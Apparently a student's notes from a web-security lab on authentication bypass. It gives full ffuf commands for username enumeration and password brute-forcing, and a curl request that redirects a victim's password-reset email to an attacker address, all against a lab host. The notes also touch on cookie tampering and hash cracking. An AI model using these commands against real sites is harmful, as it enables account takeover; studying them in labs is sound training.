Username enumeration 

here we will refer to two methods of succesfull user enumeration i.e 

1. error messages like - incorrect password , incase if a username is correct

or 

2. create a new user with fake data to see if "username already exist"

here we will use ffuf tool to automate this process i.e method 2 to see if username already exist condition is met 

Command will look like 

"ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.72.168/customers/signup -mr "username already exists""

where 

-w for wordlist 

-X for method used i.e GET , POST etc.

-d to add data to be sent i.e username , password and confirm password 

-H for adding aditional headers to our request 

-u for specifying url 

-mr to specify the text we are looking for 


---------------------------------------------------

Bruteforcing usernames with passwords to find a valid password 

here we will use ffuf and use 2 wordlist together 

command will be like 


"ffuf -w usernames.txt:W1,/home/kali/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.72.168/customers/login -fc 200"

  ->  :W1 to specify wordlist as "W1"
  ->  :W2 to specify wordlist as "W2" 

  most of the other arguments are same as above , here rather then "FUZZ" keyword we got W1 and W2 with username=W1&password=W2 .

  we used -fc to find status code other than "200" i.e 
  "302" for a sucessful login , 302 is for redirect 


  -------------------------------------------------------

  Logic Flaw 

  Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website. 


  we can manipulate logic flaws by using burpsuite or curl

  here we learned how to use curl to change post parameter in our request to send email to us 


  commands used are :- 

first command

  " curl 'http://10.10.72.168/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert' "

Second Command

  "curl 'http://10.10.72.168/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com' "

here we manipulated post data in 2nd command to completely change the email being send to genuiene user to malicious user.


-----------------------

Cookies Manipulation

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.


The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/

--------
Hashing

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.  

hashing algorithm examples are md5 , sha-256 , sha512 , sha1

 https://crackstation.net/ keep databases of billions of hashes and their original strings.

-------------------------

Encoding

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible.

encoding converts binary to human readable text so that ascii or text only supported platforms can use our cookies 

examples base64 and base 32

---------------------------------